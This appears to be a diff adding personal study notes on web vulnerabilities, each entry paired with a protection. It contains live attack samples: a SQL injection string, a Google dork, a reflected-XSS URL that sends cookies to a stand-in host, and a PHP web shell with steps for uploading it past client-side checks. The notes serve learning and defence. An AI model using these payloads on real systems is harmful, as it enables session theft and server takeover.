@@ -1,0 +1,100 @@
+-SQL Injection
+in sql injection th quote in the end of a string terminates the query early 
+causing a syntax error
+' or 1=1-- (the following terminates the query, adds a true value and then
+the -- characters caused the database to ignore the rest of the SQL statement
+protection:
+parameterized statements - sql databases use database drivers. This allows
+an application to construct and run SQL statements against a database and
+manipulating data as needed.
+-XSS Injection
+cookie stealing to perform session hijacking
+in general: <script></script> and something inside
+protection:
+escape dynamic content 
+-Command execution
+if parameters are not sanitized when using system commands, then you can have
+a command execution
+commmand && echo 'something' - if this shows up it means that the system
+can run multiple commands
+protection:
+sanitize untrusted input
+chroot jail
+-Clickjacking
+Trick the users to click on a harmful link, disguised aas something else
+1)build a similar URL and include the target's site in an iframe
+2)the attacker adds a transparent div on top of the iframe wth a higher z-index
+3)wrap that div in a link tag
+protection:
+an X-frame-option HTTP can be used to indicate whether or not a browser should be allowed
+to render a page in a frame, iframe or object.
+using Content-Security-Policy provides a broader range of protection
+-Cross-Site Request Forgery (CSRF)
+forge HTTP request to the server and trick the users to trigger unwanted actions
+interact with a page or a script on a thrid-party site that generates malicious request to the target site
+the server sees an HTTP request from a user but the form of the data is sent by an attacker
+**in GET requests all the information is carried in the URL
+send a link with a payload and make the victim to open the link
+protection:
+use REST(Representation State Transfer) assign certain types of action (view,create,delete.update) to sifferent HTTP verbs
+use Anti-Forgery tokens - include a unique token to each HTTP response
+-Directory Traversal
+URL's describing file paths are safely interpreted or else a hacker can get access to sensitive files
+**server has to types of file: accessible by the browser (Javascript or CSS) and those that are not
+a misconfigured server can be too permissive about what files to return
+if a site indexed on Google has URL's that pass file names in the query string, is likely to have a potential vulnerability
+try this google dork: site:<yourdomain.com> inurl:file=
+protection:
+content management system - third party tools
+indirection - white-list valid names and avoid fragility
+sanitization of filename parametes
+-Reflected XSS
+if a channel allows Javascript to be bounced off the server is a reflected xss
+example - a search parameter appears in the URL too 
+so let's try this to the URL to see if it has a reflected xss vulnerability:
+ www.welp.com?search=<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script> 
+search results, error pages and form submissions are good types that might be vulnerable to reflected xss
+protection:
+escape dynamic content
+whitelist values
+implement Content-Security-Policy to control where Javascript can be loaded
+-DOM-based XSS (Document Object Model)
+not all cross-site scriptitng attacks require server vulnerabilities - if it makes use of URI fragments 
+**URI fragment is the part of the URL after the # sign
+these are not sent with HTTP requests so they need to be interpreted by client-side JavaScript
+(exmaple)the site updates the page number directly from the URI fragment, without checking the contents - this means a DOM-based XSS
+protection:
+**impossible to detect from the server side. Any page that uses URI fragments is potentially at risk from XSS attacks
+Use a Javascript framework (Ember, AngularJS, React)
+code audit
+-File Upload Vulnerability
+smuggle malicious scripts to a server via file uploading 
+if you can somehow find a way to bypass file upload restrictions you can upload any malicious script
+(example) 
+1)you found out that an image upload is checked by javascript
+2)you write a simple php script likke that:
+<?php
+  if(isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+  } else {
+    echo "What is your bidding?";
+  }
+?>
+3)you disable javascript in the browser (so that the file check can not be done)
+4) you upload the script and then you can pass in the 'cmd' parameter any command you like
+protection:
+segregate the uploads (consider using cloud-based storage or a contetn management system)
+ensure file upload cannot be executed 
+-Broken Access Control
+All resources need to have access control implemented, otherwise it will lead to problems
+** security through obscurity - best avoided
+all appllications need to protect sensitive data
+protection:
+decide the biggest risks and mitigate those risks
+implement access control techniques
+-Open Redirects
+If a site forwards to URL's supplied in a query string, they could enable phishing attacks
+if it doesnt check the string provided leads to an open redirect
+protection:
+disallow offsite redirects
